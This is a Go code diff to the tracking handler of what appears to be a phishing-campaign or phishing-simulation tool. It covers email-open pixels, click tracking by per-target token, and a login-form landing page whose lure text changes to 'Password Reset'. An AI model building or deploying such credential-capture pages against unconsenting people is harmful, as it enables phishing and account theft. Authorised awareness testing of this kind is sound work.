@@ -23,7 +23,7 @@ func NewTrackingHandler(db *gorm.DB) *TrackingHandler {
 
 // TrackOpen logs email open event and returns 1x1 transparent GIF
 func (h *TrackingHandler) TrackOpen(w http.ResponseWriter, r *http.Request) {
-    fmt.Println("🔥 TrackOpen hit:", r.RemoteAddr)
+	fmt.Println("🔥 TrackOpen hit:", r.RemoteAddr)
 	token := chi.URLParam(r, "token")
 
 	// Find target by token
@@ -53,7 +53,7 @@ func (h *TrackingHandler) TrackOpen(w http.ResponseWriter, r *http.Request) {
 
 // TrackClick logs click event and redirects to landing page
 func (h *TrackingHandler) TrackClick(w http.ResponseWriter, r *http.Request) {
-    fmt.Println("🔥 TrackClick hit:", r.RemoteAddr)
+	fmt.Println("🔥 TrackClick hit:", r.RemoteAddr)
 	token := chi.URLParam(r, "token")
 
 	// Find target by token
@@ -93,7 +93,7 @@ func (h *TrackingHandler) ServeLandingPage(w http.ResponseWriter, r *http.Reques
 
 	// Serve landing page HTML
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	
+
 	tmpl := template.Must(template.New("landing").Parse(landingPageHTML))
 	tmpl.Execute(w, map[string]interface{}{
 		"Token": token,
@@ -148,7 +148,7 @@ func (h *TrackingHandler) TrackSubmit(w http.ResponseWriter, r *http.Request) {
 func serveTrackingPixel(w http.ResponseWriter) {
 	// Base64 encoded 1x1 transparent GIF
 	gif, _ := base64.StdEncoding.DecodeString("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
-	
+
 	w.Header().Set("Content-Type", "image/gif")
 	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
 	w.Header().Set("Pragma", "no-cache")
@@ -301,8 +301,8 @@ const landingPageHTML = `
         <div class="logo">
             <div class="logo-icon">🔒</div>
         </div>
-        <h1>Account Verification</h1>
-        <p class="subtitle">Please verify your identity to continue</p>
+        <h1>Password Reset</h1>
+        <p class="subtitle">Please reset your password</p>
         
         <form id="loginForm">
             <input type="hidden" id="token" value="{{.Token}}">
